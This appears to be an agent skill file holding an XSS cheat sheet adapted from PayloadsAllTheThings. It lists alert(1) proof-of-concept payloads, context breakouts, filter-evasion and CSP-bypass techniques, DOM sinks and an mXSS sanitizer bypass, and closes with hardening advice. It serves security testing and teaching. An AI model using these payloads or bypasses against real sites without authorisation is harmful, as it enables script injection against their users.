---
name: xss
description: Find and exploit reflected, stored, DOM, mXSS, and CSP-bypass XSS; payload techniques for filter evasion and modern framework contexts
domain: cybersecurity
subdomain: web-application-security
tags: [xss, dom-xss, stored-xss, csp-bypass, mxss]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/XSS Injection
---

# Cross-Site Scripting (XSS)

## Overview
Injecting attacker JS into a page that runs in a victim's browser. Categories: Reflected (URL → response), Stored (DB → other users), DOM (sink in client JS), Mutation (mXSS — innerHTML re-parses to dangerous form), Self (only attacker; chain to exploitable via CSRF or login-as-victim).

## Core Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
javascript:alert(1)              (in href / src)
"><script>alert(1)</script>
```

## Context-Specific
- **In `<script>` block**: break out with `</script><svg onload=...>`.
- **In JS string**: `";alert(1)//`.
- **In attribute (unquoted)**: ` onclick=alert(1)`.
- **In `href`**: `javascript:alert(1)`.
- **In `style`**: `expression(alert(1))` (IE), `behavior:url(#x);`.
- **In SVG**: `<svg><script>alert(1)</script></svg>`.

## Filter Bypass Tricks
- Case: `<ScRiPt>`.
- No parens: `<img src=x onerror="onerror=alert;throw 1">`.
- Backticks: `alert\`1\``.
- HTML entities: `<img src=x onerror=&#97;lert(1)>`.
- Char codes: `eval(String.fromCharCode(97,108,...))`.
- `data:` URI in iframe src.
- JSFuck / aaencode for full obfuscation.

## DOM XSS Sinks
`innerHTML`, `outerHTML`, `document.write`, `setAttribute('src'/'href'/'data')`, `location` assignments, `eval`, `Function`, `setTimeout/Interval(string)`, jQuery `$(html)`, `parseHTML`.
Sources: `location.hash`, `location.search`, `document.referrer`, `postMessage`, `localStorage`, URL params.

## mXSS
Round-trip via `innerHTML` re-parses content; payloads like `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` survive sanitizers.

## CSP Bypass
- Whitelisted CDNs hosting JSONP endpoints (`AngularJS`, `Google Maps`).
- `'unsafe-inline'` / `'unsafe-eval'`.
- Loose `script-src 'self'` + arbitrary file upload to same origin.
- Strict-dynamic with nonce reuse / dangling markup.
- AngularJS sandbox escapes (legacy).
- Browser-cache poisoning.

## Tools
- **XSStrike**, **Dalfox**, **kxss**, **bxss**.
- **DOM Invader** (Burp).
- **Trusted Types violations** in console.

## Hardening
- Output encode by context (HTML, attribute, JS, CSS, URL).
- Strict CSP: nonces, no `unsafe-inline`/`unsafe-eval`, `script-src 'self'` strict-dynamic.
- Trusted Types in modern browsers.
- HttpOnly + Secure + SameSite on session cookies.
- Framework auto-escape (React, Vue, Angular) — beware of `dangerouslySetInnerHTML` / `[innerHTML]` / `v-html`.

## References
- `payloadsallthethings/XSS Injection/README.md`
- PortSwigger XSS labs; HTML5 Security Cheatsheet (Heyes).
